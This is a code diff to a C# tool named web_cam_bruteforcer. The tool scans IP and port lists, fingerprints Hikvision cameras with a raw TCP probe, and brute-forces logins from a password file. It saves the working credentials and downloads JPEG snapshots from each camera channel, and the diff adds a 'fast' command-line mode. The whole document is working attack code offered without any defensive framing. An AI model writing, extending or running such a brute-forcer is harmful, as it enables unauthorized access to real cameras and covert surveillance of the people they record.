@@ -8,6 +8,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using HCNetSDK;
 using System.Drawing;
+using CommandLine;
 
 namespace web_cam_bruteforcer
 {
@@ -19,26 +20,24 @@ namespace web_cam_bruteforcer
         public static string PasswordFile = "data/passwords.txt";
         public static string PicturesDir = "pictures";
         public static string OutputFile = "output.txt";
+        public static bool FastMode;
 
-        public static byte[] MessageBytes =
+        static void Main(string[] args)
         {
-            0x00, 0x00, 0x00, 0x20, 0x63, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-        };
-
-        static void Main()
-        {
-            Preparation();
+            var options = new Options();
+            if (Parser.Default.ParseArguments(args, options))
+            {
+                FastMode = options.FastMode;
+            }
+            CHCNetSDK.NET_DVR_Init();
+            if (!FastMode)
+                Preparation();
             Thread thread = new Thread(Start);
             thread.Start();
         }
 
         public static void Preparation()
         {
-            CHCNetSDK.NET_DVR_Init();
-
             if (!Directory.Exists(PicturesDir))
                 Directory.CreateDirectory(PicturesDir);
 
@@ -94,9 +93,6 @@ namespace web_cam_bruteforcer
             List<Task> tasks = new List<Task>();
             foreach (string ip in ips)
             {
-                Console.ForegroundColor = ConsoleColor.DarkCyan;
-                Console.WriteLine("Used " + ip);
-                Console.ResetColor();
                 tasks.Add(Task.Factory.StartNew(() =>
                 {
                     foreach (string port in ports)
@@ -106,18 +102,18 @@ namespace web_cam_bruteforcer
                         {
                             foreach (string password in passwords)
                             {
-                                if (IsCamera(ip, scanPort))
-                                {
-                                    if (BruteCam(ip, scanPort, login, password))
-                                    {
-                                        return;
-                                    }
-                                }
-                                else
+                                Console.ForegroundColor = ConsoleColor.DarkCyan;
+                                Console.WriteLine("Used " + ip + ":" + port);
+                                Console.ResetColor();
+                                if (!IsCamera(ip, scanPort))
                                 {
                                     Console.ForegroundColor = ConsoleColor.Red;
-                                    Console.WriteLine(ip + ":" + scanPort + " is dead");
+                                    Console.WriteLine(ip + ":" + port + " is dead");
                                     Console.ResetColor();
+                                    return;
+                                }
+                                if (BruteCam(ip, scanPort, login, password))
+                                {
                                     return;
                                 }
                             }
@@ -137,32 +133,35 @@ namespace web_cam_bruteforcer
             Console.WriteLine("Trying " + login + ":" + password + " for " + ip + ":" + port);
             Console.ResetColor();
             int uid = CHCNetSDK.NET_DVR_Login_V30(ip, port, login, password, ref deviceInfo);
-            if (uid >= 0)
+            if (uid != -1)
             {
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine("Logged in: " + login + ":" + password + "@" + ip + ":" + port);
                 Console.ResetColor();
-                File.AppendAllText(OutputFile, login + ":" + password + "@" + ip + ":" + port + "\n");
-
-                for (int channel = deviceInfo.byStartChan;
-                    channel < deviceInfo.byChanNum + deviceInfo.byStartChan;
-                    channel++)
+                if (!FastMode)
                 {
-                    string filename = PicturesDir + "/" + login + "_" + password + "_" + ip + "_" + port + "_" +
-                                      channel + ".jpg";
-                    CHCNetSDK.NET_DVR_JPEGPARA netDvrJpegpara = new CHCNetSDK.NET_DVR_JPEGPARA
+                    File.AppendAllText(OutputFile, login + ":" + password + "@" + ip + ":" + port + "\n");
+                    for (int channel = deviceInfo.byStartChan;
+                        channel < deviceInfo.byChanNum + deviceInfo.byStartChan;
+                        channel++)
                     {
-                        wPicQuality = 0,
-                        wPicSize = 2
-                    };
-                    if (CHCNetSDK.NET_DVR_CaptureJPEGPicture(uid, channel, ref netDvrJpegpara, filename))
-                    {
-                        Console.ForegroundColor = ConsoleColor.Cyan;
-                        string size = GetImageSize(filename);
-                        Console.WriteLine("Downloaded picture (channel " + channel + ", size " + size +
-                                          ") from the camera " + ip + ":" +
-                                          port);
-                        Console.ResetColor();
+                        string filename = PicturesDir + "/" + login + "_" + password + "_" + ip + "_" + port + "_" +
+                                          channel + ".jpg";
+                        CHCNetSDK.NET_DVR_JPEGPARA netDvrJpegpara = new CHCNetSDK.NET_DVR_JPEGPARA
+                        {
+                            wPicQuality = 0,
+                            wPicSize = 2
+                        };
+                        if (CHCNetSDK.NET_DVR_CaptureJPEGPicture(uid, channel, ref netDvrJpegpara, filename))
+                        {
+                            Image image = Image.FromFile(filename);
+                            string size = image.Width + "x" + image.Height;
+                            Console.ForegroundColor = ConsoleColor.Cyan;
+                            Console.WriteLine("Downloaded picture (channel " + channel + ", size " + size +
+                                              ") from the camera " + ip + ":" +
+                                              port);
+                            Console.ResetColor();
+                        }
                     }
                 }
                 CHCNetSDK.NET_DVR_Logout_V30(uid);
@@ -177,20 +176,19 @@ namespace web_cam_bruteforcer
             {
                 try
                 {
+                    byte[] message =
+                    {
+                        0x00, 0x00, 0x00, 0x20, 0x63, 0x00, 0x00, 0x00,
+                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+                    };
                     tcpClient.Connect(server, port);
                     NetworkStream networkStream = tcpClient.GetStream();
-                    networkStream.Write(MessageBytes, 0, MessageBytes.Length);
-                    byte[] data = new byte[1024];
-                    using (MemoryStream ms = new MemoryStream())
-                    {
-                        int numBytesRead;
-                        while ((numBytesRead = networkStream.Read(data, 0, data.Length)) > 0)
-                        {
-                            ms.Write(data, 0, numBytesRead);
-                        }
-                        byte[] readed = ms.ToArray();
-                        return readed[3] == 0x10 && readed[7] == readed[11];
-                    }
+                    networkStream.Write(message, 0, message.Length);
+                    byte[] response = new byte[16];
+                    networkStream.Read(response, 0, response.Length);
+                    return response[3] == 0x10 && response[7] == response[11];
                 }
                 catch (Exception)
                 {
@@ -198,11 +196,20 @@ namespace web_cam_bruteforcer
                 }
             }
         }
+    }
 
-        public static string GetImageSize(string filename)
+    class Options
+    {
+        [Option('f', "fast", DefaultValue = false)]
+        public bool FastMode { get; set; }
+
+        [ParserState]
+        public IParserState LastParserState { get; set; }
+
+        [HelpOption]
+        public string GetUsage()
         {
-            Image objImage = Image.FromFile(filename);
-            return objImage.Width + "x" + objImage.Height;
+            return "";
         }
     }
 }
